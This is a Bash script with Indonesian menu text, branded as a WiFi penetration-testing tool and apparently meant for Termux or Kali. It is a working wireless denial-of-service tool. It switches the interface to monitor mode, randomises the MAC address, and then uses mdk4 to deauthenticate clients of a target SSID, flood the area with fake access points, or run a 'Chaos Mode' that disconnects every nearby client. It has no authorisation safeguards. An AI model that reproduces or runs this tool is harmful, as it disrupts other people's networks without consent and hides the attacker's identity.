#!/bin/bash

# ============================================================
# Project  : KAWAII DEAUTHER PRO V.2026 (Rolandino Edition)
# Author   : Rolandino (Coded By Rolandino!)
# Brand    : SPY-E | AI7 Studio | 123Tool
# Platform : Termux (Root), Kali Linux, Parrot OS
# Purpose  : Professional WiFi Penetration Testing Tool
# ============================================================

# --- Colors for UI ---
GR='\033[0;32m'; RD='\033[0;31m'; YW='\033[1;33m'; CY='\033[0;36m'
WH='\033[1;37m'; NT='\033[0m'; BD='\033[1m'

function banner() {
    clear
    echo -e "${CY}${BD}╭━━━━┳╮╭━━━━┳━━━┳━━━━┳━━━┳━━━╮${NT}"
    echo -e "${CY}${BD}┃╭╮╭╮┃┃┃╭╮╭╮┃╭━╮┃╭╮╭╮┃╭━╮┃╭━╮┃${NT}"
    echo -e "${CY}${BD}╰╯┃┃╰┫╰╯╯┃┃╰┫┃ ┃╰╯┃┃╰┫╰━╯┃╰━━╮${NT}"
    echo -e "${YW}${BD}  ┃┃  ┃╭╮┃┃┃  ┃╰━╯┃  ┃┃  ┃╭╮╭┻━━╮┃${NT}"
    echo -e "${YW}${BD}  ┃┃  ┃┃┃╰┫┃  ┃╭━╮┃  ┃┃  ┃┃┃╰┫╰━╯┃${NT}"
    echo -e "${RD}${BD}  ╰╯  ╰╯╰━╯╯  ╰╯ ╰╯  ╰╯  ╰╯╰━┻━━━╯${NT}"
    echo -e "${WH}  [ VERSION 2026 - POWERED BY SPY-E & AI7 ]${NT}"
    echo -e "${CY}=============================================${NT}"
}

# --- Check Root & Dependencies ---
function check_system() {
    echo -e "${YW}[*] Inisialisasi Sistem & Cek Senjata...${NT}"
    if [[ $EUID -ne 0 ]]; then
       echo -e "${RD}[!] Error: Kamu harus menjalankan ini sebagai ROOT!${NT}"
       exit 1
    fi

    # Cek Platform
    if [ -d "/data/data/com.termux/files/usr" ]; then
        PKG_MGR="pkg install -y"
    else
        PKG_MGR="sudo apt-get install -y"
    fi

    TOOLS=(mdk4 macchanger iw nmcli)
    for tool in "${TOOLS[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RD}[!] $tool tidak ditemukan. Menginstall otomatis...${NT}"
            $PKG_MGR $tool
        fi
    done
}

# --- Monitor Mode Setup ---
function set_monitor() {
    echo -e "${GR}[+] Mengaktifkan Monitor Mode pada $1...${NT}"
    ip link set $1 down
    iw dev $1 set type monitor
    ip link set $1 up
    macchanger -r $1 | grep "New MAC"
}

# --- Main Logic ---
banner
check_system

# Interface Selector
echo -e "\n${CY}${BD}Pilih Interface WiFi Anda:${NT}"
interfaces=($(ls /sys/class/net | grep -E "wlan|wlp|wlx"))
if [ ${#interfaces[@]} -eq 0 ]; then
    echo -e "${RD}[!] Tidak ada interface WiFi terdeteksi!${NT}"
    exit 1
fi

for i in "${!interfaces[@]}"; do
    echo -e " [${YW}$i${NT}] ${interfaces[$i]}"
done
read -p "Masukkan Nomor Interface: " iface_idx
selected_iface=${interfaces[$iface_idx]}

while true; do
    banner
    echo -e "${WH}Interface: ${GR}$selected_iface ${NT}| ${WH}Mode: ${YW}Monitor${NT}"
    echo -e "\n${CY}--- MENU PENGUJIAN ---${NT}"
    echo -e " [${YW}1${NT}] Scan & Deauth Target (Putuskan WiFi)"
    echo -e " [${YW}2${NT}] Spam Fake AP (Banjir WiFi Palsu)"
    echo -e " [${YW}3${NT}] Chaos Mode (Hajar Semua Client Sekitar)"
    echo -e " [${YW}4${NT}] Restore Interface & Exit"
    echo -e "${CY}----------------------${NT}"
    read -p "Pilih Opsi >> " opt

    case $opt in
        1)
            echo -e "${YW}[*] Scanning WiFi... (Tunggu 3 detik)${NT}"
            nmcli dev wifi rescan && sleep 2
            nmcli -f "SSID,BSSID,CHAN,BARS" dev wifi
            echo -ne "\n${RD}Masukkan SSID Target: ${NT}"; read target_ssid
            set_monitor $selected_iface
            mdk4 $selected_iface d -n "$target_ssid"
            ;;
        2)
            echo -e "${YW}[*] Menggunakan list SSID dari file .txt...${NT}"
            read -p "Nama file list (Default: list.txt): " wlist
            wlist=${wlist:-list.txt}
            if [ ! -f "$wlist" ]; then
                echo -e "${RD}[!] File $wlist tidak ditemukan!${NT}"
                sleep 2; continue
            fi
            set_monitor $selected_iface
            mdk4 $selected_iface b -f $wlist -a -s 1000
            ;;
        3)
            set_monitor $selected_iface
            echo -e "${RD}[!!!] CHAOS MODE AKTIF! Menghancurkan semua koneksi...${NT}"
            mdk4 $selected_iface d
            ;;
        4)
            echo -e "${YW}[*] Mengembalikan Interface ke Managed Mode...${NT}"
            ip link set $selected_iface down
            iw dev $selected_iface set type managed
            ip link set $selected_iface up
            echo -e "${GR}[V] Sukses. Arigato, Nyan!${NT}"
            exit 0
            ;;
        *)
            echo -e "${RD}[!] Pilihan Tidak Valid!${NT}"; sleep 1 ;;
    esac
done
